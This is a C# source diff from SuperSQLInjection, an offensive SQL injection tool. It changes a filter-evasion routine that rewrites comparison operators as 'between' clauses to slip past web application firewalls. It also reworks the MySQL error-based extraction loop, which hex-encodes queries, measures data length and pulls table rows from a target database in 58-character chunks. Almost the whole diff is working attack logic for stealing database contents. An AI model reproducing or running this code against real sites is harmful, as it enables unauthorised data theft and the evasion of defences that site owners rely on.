@@ -230,7 +230,7 @@ namespace SuperSQLInjection
             return sid;
         }
 
-        public static int version = 20181205;
+        public static int version = 20181206;
         public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=SSuperSQLInjection&NO=" + URLEncode.UrlEncode(getSid()) + "&VERSION=" + version;
         //检查更新
         public void checkUpdate()
@@ -1760,32 +1760,28 @@ namespace SuperSQLInjection
         private String ByPassForBetween(String paylaod, int len)
         {
 
-            String newpayload = "";
-            if (config.useBetweenByPass == false)
+            String newpayload = paylaod.Replace("{len}", len + "");
+            if(config.useBetweenByPass)
             {
-                newpayload = paylaod.Replace("{len}", len + "");
-            }
-            else
-            {
-                paylaod = paylaod.Replace("{len}", "");
-                if (paylaod.IndexOf(">=") != -1)
+               
+                if (newpayload.IndexOf(">=") != -1)
                 {
-                    newpayload = paylaod.Replace(">=", " not between 0 and " + (len - 1));
+                    newpayload = newpayload.Replace(">=", " not between 0 and " + (len - 1));
                 }
-                else if (paylaod.IndexOf(">") != -1)
+                else if (newpayload.IndexOf(">") != -1)
                 {
-                    newpayload = paylaod.Replace(">", " not between 0 and " + len);
+                    newpayload = newpayload.Replace(">", " not between 0 and " + len);
                 }
-                else if (paylaod.IndexOf("=") != -1)
+                else if (newpayload.IndexOf("=") != -1)
                 {
-                    newpayload = paylaod.Replace("=", " between " + len + " and " + len);
+                    newpayload = newpayload.Replace("=", " between " + len + " and " + len);
                 }
                 else if (paylaod.IndexOf("<") != -1)
                 {
-                    newpayload = paylaod.Replace("<", " between 0 and " + len);
-                }
-
+                    newpayload = newpayload.Replace("<", " between 0 and " + len);
+                }    
             }
+            
             return newpayload;
         }
        
@@ -3862,44 +3858,45 @@ namespace SuperSQLInjection
             try
             {
                 GetDataPam gp = (GetDataPam)opam;
+                //获取数据长度
 
-                ListViewItem lvi = null;
-                foreach (String column in gp.columns)
+                String datas_payload_columns = MySQL.hex_value.Replace("{data}", MySQL.creatMySQLColumnsNoConcatStr(gp.columns, gp.table, gp.dbname, gp.limit));
+                String datas_payload_length = MySQL.concatMySQLColumn(MySQL.char_length.Replace("{data}", datas_payload_columns));
+
+                String datas_payload_length_error = MySQL.error_value.Replace("{data}", datas_payload_length);
+
+                String result_length = getOneDataByUnionOrError(datas_payload_length_error);
+
+                int sumlen = Tools.convertToInt(result_length);
+
+                String result = "";
+                int start = 1;
+                //每次获取长度，err方式有长度限制59个字符
+                int count = 64 - 6;
+                this.Invoke(new showLogDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！", LogLevel.info);
+                while (start < sumlen)
                 {
-                    //获取数据长度
+                    //hex编码，防止中文等乱码
+                    String datas_value_column = ByPassForBetween(MySQL.substr_value.Replace("{data}", datas_payload_columns).Replace("{start}", start.ToString()), count);
+                    String c_datas_value_payload = MySQL.error_value.Replace("{data}", MySQL.concatMySQLColumn(datas_value_column));
+                    result += getOneDataByUnionOrError(c_datas_value_payload);
+                    start += count;
+                }
 
-                    String datas_payload_columns = MySQL.creatMySQLColumnStr(column);
-                    String datas_payload_length = MySQL.char_length.Replace("{data}", "(select " + datas_payload_columns + " from " + gp.dbname + "." + gp.table + " limit " + gp.limit + ",1)");
-
-                    String d_l_e = MySQL.creatMySQLColumnStr("(" + datas_payload_length + ")");
-                    String datas_payload_length_error = MySQL.error_value.Replace("{data}", d_l_e);
-
-                    String result_length = getOneDataByUnionOrError(datas_payload_length_error);
-
-                    int sumlen = Tools.convertToInt(result_length);
-                    String datas_value_payload = "(select " + MySQL.creatMySQLColumnsStrByError(column, gp.table, gp.dbname, gp.limit) + ")";
-                    String result = "";
-                    int start = 1;
-                    //每次获取长度，err方式有长度限制
-                    int count = 64 - 6;
-                    this.Invoke(new showLogDelegate(log), "报告大侠，正在获取数据，每次请求将获取" + count + "字符！", LogLevel.info);
-                    while (start < sumlen)
-                    {
-                        //hex编码，防止中文等乱码
-                        String datas_value_column = ByPassForBetween(MySQL.substr_value.Replace("{data}", datas_value_payload).Replace("{start}", start.ToString()), count);
-                        String c_datas_value_payload = MySQL.error_value.Replace("{data}", datas_value_column);
-                        result += getOneDataByUnionOrError(c_datas_value_payload);
-                        start += count;
-                    }
+                result = Tools.unHex(result, "UTF-8");
+                String[] items = Regex.Split(result, "\\$\\$\\$");
+                ListViewItem lvi = null;
+                foreach (String item in items)
+                {
                     if (lvi == null)
                     {
-                        lvi = new ListViewItem(result);
+
+                        lvi = new ListViewItem(item);
                     }
                     else
                     {
-                        lvi.SubItems.Add(result);
+                        lvi.SubItems.Add(item);
                     }
-
                 }
                 this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                 this.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);
@@ -5739,7 +5736,7 @@ namespace SuperSQLInjection
                         try
                         {
                             String payload_len = MySQL.char_length.Replace("{data}", data_payload);
-                            String payload_len_error = MySQL.error_value.Replace("{data}", MySQL.creatMySQLColumnStr(payload_len));
+                            String payload_len_error = MySQL.error_value.Replace("{data}", MySQL.concatMySQLColumn(payload_len));
 
                             String result_length = getOneDataByUnionOrError(payload_len_error);
 
@@ -5755,7 +5752,7 @@ namespace SuperSQLInjection
                             while (start < sumlen)
                             {
                                 //hex编码，防止中文等乱码
-                                String datas_value_tmp = ByPassForBetween(MySQL.creatMySQLColumnStr(MySQL.substr_value.Replace("{data}", data_payload).Replace("{start}", start.ToString())), count);
+                                String datas_value_tmp = ByPassForBetween(MySQL.creatMySQLColumnCastStr(MySQL.substr_value.Replace("{data}", data_payload).Replace("{start}", start.ToString())), count);
                                 String c_datas_value_payload = MySQL.error_value.Replace("{data}", datas_value_tmp);
                                 result += getOneDataByUnionOrError(c_datas_value_payload);
                                 start += count;
